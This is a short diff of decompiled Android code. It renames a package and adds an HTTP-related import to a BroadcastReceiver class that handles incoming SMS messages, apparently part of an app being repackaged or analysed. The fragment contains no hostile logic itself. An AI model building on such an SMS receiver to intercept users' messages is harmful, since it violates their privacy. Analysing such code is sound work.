@@ -1,6 +1,6 @@
 // Decompiled by JEB v1.5.201408040 - http://www.android-decompiler.com
 
-package com.tyj.onepiece;
+package com.agame;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -9,6 +9,8 @@ import android.net.Uri;
 import android.os.Handler;
 import android.telephony.SmsMessage;
 import android.util.Log;
+
+import com.agame.http.Wksvr;
 
 public class TRecevier extends BroadcastReceiver {
         private static TContentObserver content;
